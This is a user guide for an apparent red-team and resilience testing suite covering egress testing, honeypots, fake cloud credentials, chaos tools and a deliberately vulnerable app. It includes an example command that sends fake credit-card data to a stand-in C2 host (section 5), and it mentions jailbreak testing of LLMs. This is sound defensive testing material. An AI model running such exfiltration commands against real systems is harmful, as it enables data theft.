# Apparatus User Guide

## 1. Introduction
**Apparatus** (formerly Tracer) is a comprehensive Red Team & Adversary Emulation Suite designed for validating WAFs, API Gateways, and Egress Filters. It serves as the "Swiss Army Knife" of the Apparatus Resilience Lab.

## 2. Installation & Deployment

### 2.1 Docker
The easiest way to run Apparatus is via Docker.

```bash
docker build -t apparatus:latest .
docker run -p 8080:8080 -p 8443:8443 -p 50051:50051 -p 1883:1883 apparatus:latest
```

### 2.2 Kubernetes (Helm)
An Apparatus Helm chart is provided in `helm/ts-apparatus`.

```bash
# Deploy with default values
helm install apparatus ./helm/ts-apparatus
```

---

## 3. Quarterdeck (Command Center)

The centralized dashboard for controlling the suite.
**URL:** `/dashboard`

Quarterdeck allows you to:
1.  **Inspect Traffic:** View real-time request logs and latency.
2.  **Red Team Ops:** Launch vulnerability scans against external targets.
3.  **Ghost Control:** Start/Stop background traffic generators.
4.  **Active Defense:** Manage "Sentinel" virtual patching rules.
5.  **AI Lab:** Interactive chat interface for testing LLM prompts and "jailbreaks".
6.  **Escape Artist:** Configure and run egress firewall scans directly from the browser.
7.  **Cluster Map:** Visualize the live gossip mesh topology using force-directed graphs.
8.  **System Status:** Monitor the health of auxiliary services (Cloud Imposter, Toxic Sidecar).

---

## 4. Core Capabilities

### 4.1 Resilience Testing (Chaos)
*   **CPU Spike**: `/chaos/cpu?duration=5000`
*   **Memory Leak**: `/chaos/memory`
*   **Crash**: `/chaos/crash`

### 4.2 Security Testing
*   **Honeypots**: Accessing `/admin`, `/etc/passwd` triggers alerts.
*   **DLP Simulator**: `/dlp?type=cc` generates fake credit card data.
*   **Red Team**: `/redteam/validate` scans targets for vulnerabilities.

---

## 5. 🌊 Egress Tester (Egress Validator)

**Formerly:** Escape Artist

Egress Tester is a CLI tool designed to be run *inside* a compromised container to test if it can "phone home" or leak sensitive data.

### Usage
```bash
# Run basic connectivity check (Ping, DNS, HTTP to public sites)
npm run escape

# Test Exfiltration with FAKE SENSITIVE DATA (DLP Mode)
npm run escape -- --target http://my-c2.com --dlp cc    # Exfiltrate fake Credit Card

# Test Egress on specific ports via TCP/UDP
npm run escape -- --ports 22,25,443,1883,8080
```

---

## 6. 🚨 Cloud Metadata Mock (Cloud Imposter)

**Formerly:** Cloud Imposter

Cloud Metadata Mock mocks Cloud Metadata Services (AWS IMDS, GCP Metadata) locally to trap cloud-native attacks.

### Usage
```bash
npm run imposter
# Starts server on port 16925
```

### Configuration
To force your application to use Cloud Metadata Mock:
```bash
export AWS_EC2_METADATA_SERVICE_ENDPOINT=http://localhost:16925
```

### Features
*   **Honey-Creds**: Serves fake AWS Credentials to detect if apps are logging them.
*   **Spot Termination**: Simulate instance shutdown events.

---

## 7. 🌬️ Chaos Proxy (Chaos Proxy)

**Formerly:** Toxic Sidecar

Chaos Proxy is a transparent reverse proxy designed to sit between your frontend and backend to inject faults.

### Usage
```bash
# Start Chaos Proxy pointing to your real service
export TARGET_URL=http://localhost:8080
npm run sidecar
# Listens on port 8081
```

### Toxicity Modes
Control chaos via `X-Toxic-Mode` header:
*   `latency`: Delays request by 500-2500ms.
*   `error_500`: Returns HTTP 500.
*   `slow_drip`: Streams response 1 byte at a time.
*   `corrupt_body`: Randomly flips bits in response.

---

## 8. 🧠 Neural (Interactive Deception)

**Formerly:** AI Honeypot

Neural is an LLM-powered interactive shell that traps attackers in a hallucinated Linux environment.

### Usage
1.  Navigate to `/admin`.
2.  Login with any credentials.
3.  You are redirected to `/console`, a fake terminal.
4.  Commands are processed by an LLM (Ollama, OpenAI, or Anthropic).

### Configuration
*   `OLLAMA_HOST`: URL to local Ollama (default: `http://localhost:11434`).
*   `OPENAI_API_KEY`: API Key for cloud fallback.

---

## 9. The Victim (Vulnerable App Simulator)

A module deliberately engineered with OWASP Top 10 vulnerabilities.

### Endpoints
*   **SQL Injection:** `GET /victim/login`
*   **Remote Code Exec:** `GET /victim/calc`
*   **Reflected XSS:** `GET /victim/guestbook`

Use **Chaos Proxy** (Chaos) or **Risk Server** (WAF) to protect this vulnerable module.

---

## 10. CLI & TUI

### 10.1 Terminal User Interface (TUI)
A hacker-style dashboard for your terminal.
```bash
npm run tui
```
**Shortcuts:**
*   `a`: Open **AI Lab** modal.
*   `e`: Open **Escape Artist** modal.
*   `x`: Release Tarpit.

### 10.2 Apparatus CLI (Labs)
Access experimental features from the command line.

```bash
# Chat with AI
apparatus labs ai-chat "Hello world"

# Run Egress Scan
apparatus labs escape-scan --target google.com --ports 80,443

# Check Infrastructure
apparatus labs imposter-status
apparatus labs sidecar-status
```
